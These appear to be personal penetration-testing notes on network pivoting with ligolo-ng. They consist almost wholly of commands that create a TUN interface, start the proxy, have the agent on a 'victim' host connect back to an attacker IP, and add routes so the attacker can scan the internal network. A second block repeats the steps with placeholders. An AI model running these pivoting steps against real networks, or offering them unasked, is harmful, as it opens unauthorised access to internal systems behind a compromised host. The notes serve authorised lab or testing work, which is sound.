on linux:
```bash
sudo ip tuntap add user root mode tun ligolo

sudo ip link set ligolo up

	sudo ~/tools/ligolo/proxy -selfcert
```

on the victim:
```bash
./agent -connect 10.10.17.138:11601 -ignore-cert

# attacker_ip:port_of_ligolo
```


adding route:
```bash
# put the interface you want to pivot in:
sudo ip route add 10.0.52.0/24 dev ligolo

#check
	└─$ ip route list
default via 192.168.100.1 dev wlan0 proto dhcp src 192.168.100.11 metric 600
10.0.52.0/24 dev ligolo scope link linkdown
```

---
> YOU CAN USE COMMAND `auto_route` to autoroute everything
---

last step is to do `start` from the attacking machine
![[Pasted image 20250826024416.png]]

now we can run normal commands from the attacker machine. Nmap or anything

[ref](https://www.hackingarticles.in/a-detailed-guide-on-ligolo-ng/)



```bash
# Attack host - Run our proxy server
sudo ligolo-proxy -selfcert

# Attack host - Establish a new interface for our pivoting
ligolo-proxy >> ifcreate --name pivot

# Victim host - Connect back to our ligolo server 
ligolo-agent -connect <ATTACK_HOST>:11601 -v -accept-fingerprint <CERT_FINGERPRINT>

# Attack host - List connected sessions and choose our established session from previous step
ligolo-proxy >> session

# Attack host - Create tunnel to the victim host
[Agent : HOSTNAME] >> tunnel_start --tun pivot 

# Attack host - Add routing to internal network
ligolo-proxy >> route_add --name pivot --route <INTERNAL_NETWORK>/<CIDR>
```